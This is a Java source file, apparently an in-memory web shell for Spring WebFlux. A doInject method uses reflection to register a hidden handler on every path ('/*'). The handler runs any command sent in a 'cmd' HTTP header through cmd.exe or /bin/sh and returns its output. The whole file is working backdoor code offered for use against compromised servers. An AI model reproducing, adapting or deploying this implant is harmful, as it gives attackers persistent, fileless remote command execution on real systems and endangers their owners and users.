import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.reactive.result.condition.PatternsRequestCondition;
import org.springframework.web.reactive.result.method.RequestMappingInfo;
import org.springframework.web.util.pattern.PathPattern;
import org.springframework.web.util.pattern.PathPatternParser;

import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.util.Map;
import java.util.Scanner;

public class SpringHandlerMS {

	public static String doInject(Object requestMappingHandlerMapping) {

		String msg = "SpringHandlerMS-Status 1";

		try {
			Method registerHandlerMethod = requestMappingHandlerMapping.getClass().getDeclaredMethod("registerHandlerMethod", Object.class, Method.class, RequestMappingInfo.class);
			registerHandlerMethod.setAccessible(true);
			Method shell = SpringHandlerMS.class.getDeclaredMethod("shell2", Map.class);
			PathPattern pathPattern = new PathPatternParser().parse("/*");
			PatternsRequestCondition patternsRequestCondition = new PatternsRequestCondition(pathPattern);
			RequestMappingInfo requestMappingInfo = new RequestMappingInfo("", patternsRequestCondition, null, null, null, null, null, null);
			registerHandlerMethod.invoke(requestMappingHandlerMapping, new SpringHandlerMS(), shell, requestMappingInfo);
			msg = "SpringHandlerMS-Status 2";
		}catch (Exception e){
			msg = "SpringHandlerMS-Status e" + e;
		}
		return msg;
	}

	// for short execute command
	public ResponseEntity<String> shell1(String cmd) throws Exception {
		String execResult = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
		return new ResponseEntity<>(execResult, HttpStatus.OK);
	}

	// optimization of shell1
	public ResponseEntity<String> shell2(@RequestHeader Map<String, String> requestHeader) throws Exception {
		String cmd = requestHeader.get("cmd");
		if (cmd != null) {
			java.lang.ProcessBuilder p;
			if (System.getProperty("os.name").toLowerCase().contains("win")) {
				p = new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", cmd});
			} else {
				p = new java.lang.ProcessBuilder(new String[]{"/bin/sh", "-c", cmd});
			}
			String execResult = new Scanner(p.start().getInputStream()).useDelimiter("\\A").next();
			return new ResponseEntity<>(execResult, HttpStatus.OK);
		} else {
			return new ResponseEntity<>(HttpStatus.NOT_FOUND);
		}
	}
}